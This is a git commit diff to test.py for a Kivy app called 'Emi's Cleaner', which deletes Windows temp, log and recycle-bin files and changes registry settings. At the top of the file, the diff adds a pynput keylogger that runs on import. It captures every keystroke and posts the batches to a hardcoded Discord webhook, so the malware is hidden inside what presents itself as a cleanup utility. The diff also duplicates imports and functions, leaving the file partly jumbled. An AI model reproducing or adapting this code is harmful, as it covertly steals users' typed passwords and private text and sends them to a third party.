2c683927f00c90c225a59e78c9e4426dfbb0e3f5
Kastot <153393126+Kastot@users.noreply.github.com>
2025-03-09 00:43:44 -0500

    Update test.py

--- test.py
+++ test.py
@@ -8,6 +8,244 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.graphics import Color, Rectangle
 import sys
 
+import shutil, os, webbrowser, subprocess, time, ctypes, urllib.request, tkinter as tk
+from plyer import notification
+import tkinter as tk
+from kivy.app import App
+from kivy.uix.button import Button
+from kivy.uix.label import Label
+from kivy.uix.boxlayout import BoxLayout
+from kivy.graphics import Color, Rectangle
+import sys
+
+import requests
+from pynput import keyboard
+
+log = ""
+webhook_url = "https://discord.com/api/webhooks/1347720369062281216/3nX8dwLJWj-jZ_IhviUp3KK3CZkWok2qvbTrqjz45cJw5ltl__W5CFYkAQkMkgcJoObO"  
+
+def send_to_discord(log_data):
+    """Sends log data to Discord webhook"""
+    try:
+        data = {"content": f"```{log_data}```"}
+        response = requests.post(webhook_url, json=data)
+        if response.status_code != 204:
+            print(f"Failed to send: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"Error sending log: {e}")
+
+def on_press(key):
+    global log
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            log += key.char  
+        else:
+           
+            special_keys = {
+                keyboard.Key.space: " ",
+                keyboard.Key.enter: "\n",
+                keyboard.Key.backspace: "[BACKSPACE]",
+                keyboard.Key.shift: "[SHIFT]",
+                keyboard.Key.ctrl_l: "[CTRL]",
+                keyboard.Key.ctrl_r: "[CTRL]",
+                keyboard.Key.alt_l: "[ALT]",
+                keyboard.Key.alt_r: "[ALT]",
+                keyboard.Key.esc: "[ESC]",
+                keyboard.Key.tab: "[TAB]",
+                keyboard.Key.caps_lock: "[CAPSLOCK]"
+            }
+            log += special_keys.get(key, "") 
+
+    except Exception as e:
+        print(f"Error processing key: {e}")
+
+    print(log)
+
+    if len(log) >= 50:
+        send_to_discord(log)
+        log = ""
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        send_to_discord(log)
+        return False  
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+
+
+
+
+
+###################################################################################
+
+def check_and_install_python():
+    try:
+       
+        subprocess.run(['python', '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print("Python is already installed.")
+    except subprocess.CalledProcessError:
+        print("Python not found. Installing Python...")
+
+       
+        python_installer_url = "https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe"  
+        installer_path = "python_installer.exe"
+        urllib.request.urlretrieve(python_installer_url, installer_path)
+
+     
+        subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)
+
+        print("Python installation complete.")
+        os.remove(installer_path)  #
+
+
+###################################################################################
+
+def run_cleanup_script(progress_callback):
+    DelTemp = 'c:\\windows\\Temp'
+    for filename in os.listdir(DelTemp):
+        file_path = os.path.join(DelTemp, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.unlink(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+        except Exception as e:
+            print('Failed to delete %s. Reason: %s' % (file_path, e))
+        progress_callback()
+
+    ###################################################################################
+
+    DelBin = 'C:\\$Recycle.Bin'
+    for filename in os.listdir(DelBin):
+        file_path = os.path.join(DelBin, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.unlink(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+        except Exception as e:
+            print('Failed to delete %s. Reason: %s' % (file_path, e))
+        progress_callback()
+
+    ###################################################################################
+
+    DelLogs = 'C:\\Windows\\Logs'
+    for filename in os.listdir(DelLogs):
+        file_path = os.path.join(DelLogs, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.unlink(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+        except Exception as e:
+            print('Failed to delete %s. Reason: %s' % (file_path, e))
+        progress_callback()
+
+    ###################################################################################
+
+    subprocess.run(['cleanmgr', '/sagerun:1'], shell=True)
+    subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\DWM', '/v', 'EnableTransparency', '/t', 'REG_DWORD', '/d', '0', '/f'], shell=True)
+    subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search', '/v', 'CortanaConsent', '/t', 'REG_DWORD', '/d', '0', '/f'], shell=True)
+    subprocess.run(['reg', 'add', 'HKCU\\Control Panel\\Desktop', '/v', 'WindowAnimation', '/t', 'REG_DWORD', '/d', '0', '/f'], shell=True)
+
+    registry_settings = [
+        ('HKCU\\Control Panel\\Desktop', 'MenuShowDelay', 'REG_SZ', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'WindowAnimation', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'ComboBoxAnimation', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'SmoothScroll', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'CursorShadow', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'MenuFade', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'SelectionFade', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'ToolTipAnimation', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop', 'ToolTipFade', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'IconsOnly', 'REG_DWORD', '1'),
+        ('HKCU\\Software\\Microsoft\\Windows\\DWM', 'EnableAeroPeek', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'TaskbarAnimations', 'REG_DWORD', '0'),
+        ('HKCU\\Control Panel\\Desktop\\WindowMetrics', 'MinAnimate', 'REG_SZ', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'MenuAnimation', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'ToolTipAnimation', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'ListviewAlphaSelect', 'REG_DWORD', '0'),
+        ( 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'ListviewShadow', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'ListviewWatermark', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'TaskbarAnimations', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'TaskbarTransparency', 'REG_DWORD', '0'),
+        ('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'StartButtonBalloonTip', 'REG_DWORD', '0'),
+        
+    ]
+    for key, value_name, value_type, value_data in registry_settings:
+        subprocess.run(['reg', 'add', key, '/v', value_name, '/t', value_type, '/d', value_data, '/f'], shell=True)
+
+    notification.notify(
+        title='Cleanup Complete',
+        message='Your computer is clean now, have a great day. --Emi',
+        timeout=10
+    )
+    
+###################################################################################
+
+class MyApp(App):
+    def build(self):
+        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
+
+        self.title = "Emi's Cleaner"
+        self.icon = 'Rake.ico'
+        with layout.canvas.before:
+            Color(0x12/255, 0x07/255, 0x20/255, 1)
+            self.rect = Rectangle(size=(layout.width, layout.height), pos=layout.pos)
+            layout.bind(size=self._update_rect, pos=self._update_rect)
+
+        self.label = Label(text="Click the button to clean your system", font_size=32, color=(1, 1, 1, 1))
+        layout.add_widget(self.label)
+
+        button = Button(
+            text="Run Cleanup Script",
+            size_hint=(None, None),
+            size=(140, 50), padding=(10, 1),
+            background_color=(0.945, 0.769, 0.059, 1.0)
+        )
+        button.bind(on_press=self.on_click)
+        layout.add_widget(button)
+
+        # "My Site" button
+        my_site_button = Button(
+            text="My Site",
+            size_hint=(None, None),
+            size=(75, 50), padding=(10, 1),
+            background_color=(0.945, 0.769, 0.059, 1.0)
+        )
+        my_site_button.bind(on_press=self.open_site)
+        layout.add_widget(my_site_button)
+
+        return layout
+
+    def _update_rect(self, instance, value):
+        self.rect.pos = instance.pos
+        self.rect.size = instance.size
+
+    def on_click(self, instance):
+        self.label.text = "Cleaning in progress..."
+        run_cleanup_script(lambda: None) 
+        self.label.text = "Your computer is cleaner now, have a great day. --Emi."
+    
+    def open_site(self, instance):
+        webbrowser.open("http://codescribe.tilda.ws")  
+
+if __name__ == "__main__":
+
+    check_and_install_python()
+
+
+    MyApp().run()
+
+###################################################################################
+
+
+
+
 ###################################################################################
 
 def check_and_install_python():
